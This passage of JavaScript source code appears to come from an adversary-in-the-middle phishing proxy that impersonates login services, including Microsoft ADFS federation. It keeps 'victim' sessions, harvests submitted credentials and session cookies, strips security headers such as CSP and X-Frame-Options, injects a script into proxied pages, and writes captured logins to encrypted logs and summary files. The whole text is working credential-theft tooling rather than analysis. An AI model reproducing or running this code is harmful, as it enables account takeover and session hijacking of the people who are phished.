    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host.replace(/[^a-zA-Z0-9.-]/g, '_')}_${new Date().toISOString().replace(/[:.]/g, '_')}`;
    VICTIM_SESSIONS[cookieName].createdAt = new Date().toISOString();
    VICTIM_SESSIONS[cookieName].targetService = {
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: phishedURL.pathname,
        port: phishedURL.port,
        host: phishedURL.host
    };
    
    // Enhanced credential tracking
    VICTIM_SESSIONS[cookieName].capturedCredentials = [];
    VICTIM_SESSIONS[cookieName].formSubmissions = [];
    VICTIM_SESSIONS[cookieName].cookieAnalysis = null;
    VICTIM_SESSIONS[cookieName].lastFormData = null;
    VICTIM_SESSIONS[cookieName].lastRequestBody = null;
    VICTIM_SESSIONS[cookieName].requestCount = 0;
    VICTIM_SESSIONS[cookieName].credentialCount = 0;
    
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);

    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);

    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];

        cipher
            .on("error", (error) => {
                reject(error);
            })
            .on("data", (chunk) => {
                encryptedData.push(chunk);
            })
            .on("end", () => {
                resolve({
                    iv: iv.toString("hex"),
                    encryptedData: Buffer.concat(encryptedData).toString("hex")
                });
            });

        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];

    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));

    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const splitRequestHostname = requestHostname.split(".");
    const splitCookieDomain = cookieDomain.split(".");

    if (splitCookieDomain.length < 2) {
        return false;
    }
    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) {
        return false;
    }
    if (splitRequestHostname.length < splitCookieDomain.length) {
        return false;
    }

    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
            return false;
        }
    }
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const splitRequestPath = requestPath.split("/");
    const splitCookiePath = cookiePath.split("/");

    if (cookiePath === "/") {
        return true;
    }
    if (splitRequestPath.length < splitCookiePath.length) {
        return false;
    }

    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i]) {
            return false;
        }
    }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return (
        isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
        isPathApplicable(requestOptions.path, cookie.path)
    );
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();

    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
        }
    }
    return Object.entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false;
    let foundDay = false;
    let foundMonth = false;
    let foundYear = false;

    let hourValue, minuteValue, secondValue;
    let dayValue, monthValue, yearValue;

    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);

    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1]);
                minuteValue = parseInt(timeMatch[2]);
                secondValue = parseInt(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);

            if (dayMatch) {
                foundDay = true;
                dayValue = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
            const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];

            for (let i = 0; i < months.length; i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    break;
                }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);

            if (yearMatch) {
                foundYear = true;
                yearValue = parseInt(yearMatch[1]);
                continue;
            }
        }
    }

    if (yearValue >= 70 && yearValue <= 99) {
        yearValue += 1900;
    } else if (yearValue >= 0 && yearValue <= 69) {
        yearValue += 2000;
    }

    if (!foundDay || !foundMonth || !foundYear || !foundTime) {
        return NaN;
    }
    if (dayValue < 1 || dayValue > 31) {
        return NaN;
    }
    if (yearValue < 1601) {
        return NaN;
    }
    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
        return NaN;
    }

    const parsedCookieDate = new Date(Date.UTC(
        yearValue,
        monthValue,
        dayValue,
        hourValue,
        minuteValue,
        secondValue
    ));

    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
        parsedCookieDate.getUTCDate() !== dayValue) {
        return NaN;
    }
    return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const currentTimestamp = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }

    for (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ...cookieValue] = cookie.split("=");

        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {

            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }

            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;

                if (!cookieDomain) {
                    cookieDomain = request.hostname;
                }
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();

                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();

                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();

                if (!/^-?\d+$/.test(cookieMaxAge)) {
                    cookieMaxAge = "";
                }
            }
        }
        if (!isCookieValid) {
            continue;
        }

        cookieExpires += clockSkew;
        if (cookieMaxAge) {
            const seconds = parseInt(cookieMaxAge);
            if (!isNaN(seconds)) {
                cookieExpires = currentTimestamp + seconds * 1000;
            }
        }

        let isNewCookie = true;

        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];

            if (sessionCookie.name === cookieName &&
                sessionCookie.domain === cookieDomain &&
                sessionCookie.path === cookiePath &&
                sessionCookie.hostOnly === cookieHostOnly) {

                if (currentTimestamp > cookieExpires) {
                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
                    break;
                }
                sessionCookie.value = cookieValue.join("=");
                sessionCookie.expires = cookieExpires;
                isNewCookie = false;
                break;
            }
        }
        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                path: cookiePath,
                expires: cookieExpires,
                hostOnly: cookieHostOnly
            });
        }
    }
}

function getValidDomains(domains) {
    const validDomains = [];

    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i++) {

            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) {
                validDomains.push(validDomain);
            }
        }
    }
    return validDomains;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders = [
        "max-forwards",
        "x-arr-log-id",
        "client-ip",
        "disguised-host",
        "x-site-deployment-id",
        "was-default-hostname",
        "x-forwarded-proto",
        "x-appservice-proto",
        "x-arr-ssl",
        "x-forwarded-tlsversion",
        "x-forwarded-for",
        "x-original-url",
        "x-waws-unencoded-url",
        "x-client-ip",
        "x-client-port"
    ];

    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.cookie = proxyRequestCookies;
    }
    else {
        delete proxyRequestOptions.headers.cookie;
    }

    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headers.referer;
    }

    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequestHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        }
        else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
        }
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const httpSecurityResponseHeaders = [
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
        "set-cookie",
        "content-security-policy",
        "content-security-policy-report-only",
        "cross-origin-opener-policy",
        "cross-origin-embedder-policy",
        "cross-origin-resource-policy",
        "permissions-policy",
        "service-worker-allowed"
    ];

    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
    const decompressionAlgorithms = {
        gzip: zlib.gunzip,
        "x-gzip": zlib.gunzip,
        deflate: zlib.inflate,
        br: zlib.brotliDecompress,
        zstd: zlib.zstdDecompress
    };

    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlgorithms[encoding];

        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedData) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        }
        else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const compressionAlgorithms = {
        gzip: zlib.gzip,
        "x-gzip": zlib.gzip,
        deflate: zlib.deflate,
        br: zlib.brotliCompress,
        zstd: zlib.zstdCompress
    };

    return new Promise((resolve, reject) => {
        const compressionAlgorithm = compressionAlgorithms[encoding];

        if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (error) reject(error);
                else resolve(compressedData);
            });
        }
        else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody(compressedData, contentEncoding) {
    if (!contentEncoding) {
        return {
            decompressedResponseBody: compressedData,
            encodings: []
        };
    }

    const encodings = contentEncoding.split(",")
        .map(encoding => encoding.trim().toLowerCase())
        .filter(encoding => encoding);

    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData = await decompressData(decompressedData, encodings[i]);
    }
    return {
        decompressedResponseBody: decompressedData,
        encodings: encodings
    };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;

    for (const encoding of encodings) {
        compressedData = await compressData(compressedData, encoding);
    }
    return compressedData;
}

function updateHTMLProxyResponse(decompressedResponseBody) {
    const payload = "<script src=/@></script>";
    const htmlInjectionMap = {
        "<head>": `<head>${payload}`,
        "<html>": `<html><head>${payload}</head>`,
        "<body>": `<head>${payload}</head><body>`
    };
    const indexLimit = 200;

    for (const [key, value] of Object.entries(htmlInjectionMap)) {
        const htmlTagBuffer = Buffer.from(key);
        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);

        if (injectionPointIndex !== -1) {
            return Buffer.concat([
                decompressedResponseBody.subarray(0, injectionPointIndex),
                Buffer.from(value),
                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
            ]);
        }
    }
    return Buffer.concat([
        Buffer.from(`<head>${payload}</head>`),
        decompressedResponseBody
    ]);
}

// Modify the FederationRedirectUrl variable to proxify the cross-origin navigation request to the ADFS portal
function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
    const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
    
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}

// Enhanced function to capture all session data before redirect
async function captureAllSessionData(currentSession, proxyRequestBody, proxyRequestOptions) {
    if (!currentSession || !VICTIM_SESSIONS[currentSession]) return;
    
    console.log(`[DATA_CAPTURE] Session: ${currentSession} - Starting comprehensive data capture`);
    
    const session = VICTIM_SESSIONS[currentSession];
    
    // 1. Capture current request data if not already captured
    if (proxyRequestBody) {
        extractAndLogFormData(proxyRequestBody, currentSession, proxyRequestOptions.path);
        session.requestCount++;
    }
    
    // 2. Ensure all cookies are analyzed and logged
    logAllCookies(currentSession);
    
    // 3. Capture any additional session metadata
    session.lastActivity = new Date().toISOString();
    session.redirectTriggered = true;
    session.redirectTimestamp = new Date().toISOString();
    
    // 4. Perform final credential analysis
    if (session.lastFormData) {
        const credentialFields = {};
        const otherFields = {};
        
        for (const [key, value] of Object.entries(session.lastFormData)) {
            const keyLower = key.toLowerCase();
            if (config.credentials.credentialFields.some(field => keyLower.includes(field))) {
                credentialFields[key] = value;
            } else {
                otherFields[key] = value;
            }
        }
        
        if (Object.keys(credentialFields).length > 0) {
            session.credentialCount++;
            session.capturedCredentials.push({
                timestamp: new Date().toISOString(),
                path: proxyRequestOptions.path,
                credentialFields: credentialFields,
                allFields: session.lastFormData,
                source: 'final_capture'
            });
        }
    }
    
    // 5. Create comprehensive session summary
    session.finalSummary = {
        timestamp: new Date().toISOString(),
        totalCookies: session.cookies.length,
        totalCredentials: session.capturedCredentials.length,
        totalRequests: session.requestCount,
        targetService: session.targetService,
        sessionDuration: Date.now() - new Date(session.createdAt).getTime(),
        dataCaptureComplete: true
    };
    
    console.log(`[DATA_CAPTURE] Session: ${currentSession} - Comprehensive data capture completed`);
    console.log(`[DATA_CAPTURE] Summary: ${session.finalSummary.totalCookies} cookies, ${session.finalSummary.totalCredentials} credentials, ${session.finalSummary.totalRequests} requests`);
}

// Function to flush all session data to disk before redirect
async function flushSessionData(currentSession) {
    if (!currentSession || !VICTIM_SESSIONS[currentSession]) return;
    
    console.log(`[DATA_FLUSH] Session: ${currentSession} - Flushing session data to disk`);
    
    try {
        // 1. Ensure log file stream is flushed
        const logFileStream = LOG_FILE_STREAMS[currentSession];
        if (logFileStream) {
            await new Promise((resolve, reject) => {
                logFileStream.end();
                logFileStream.on('finish', resolve);
                logFileStream.on('error', reject);
            });
            console.log(`[DATA_FLUSH] Session: ${currentSession} - Log file flushed successfully`);
        }
        
        // 2. Create final session summary file
        const session = VICTIM_SESSIONS[currentSession];
        const summaryPath = path.join(LOGS_DIRECTORY, `session_summary_${currentSession}.json`);
        
        const sessionSummary = {
            sessionId: currentSession,
            finalSummary: session.finalSummary,
            capturedCredentials: session.capturedCredentials,
            cookies: session.cookies,
            cookieAnalysis: session.cookieAnalysis,
            formSubmissions: session.formSubmissions,
            lastFormData: session.lastFormData,
            targetService: session.targetService,
            timestamps: {
                created: session.createdAt,
                lastActivity: session.lastActivity,
                redirectTriggered: session.redirectTimestamp
            }
        };
        
        await fs.promises.writeFile(summaryPath, JSON.stringify(sessionSummary, null, 2));
        console.log(`[DATA_FLUSH] Session: ${currentSession} - Session summary saved to: ${summaryPath}`);
        
        // 3. Mark session as completely captured
        session.dataCaptureComplete = true;
        session.dataFlushed = true;
        
        console.log(`[DATA_FLUSH] Session: ${currentSession} - All data successfully flushed to disk`);
        
    } catch (error) {
        console.error(`[ERROR] Failed to flush session data for ${currentSession}:`, error);
        // Don't fail the redirect if flushing fails
    }
}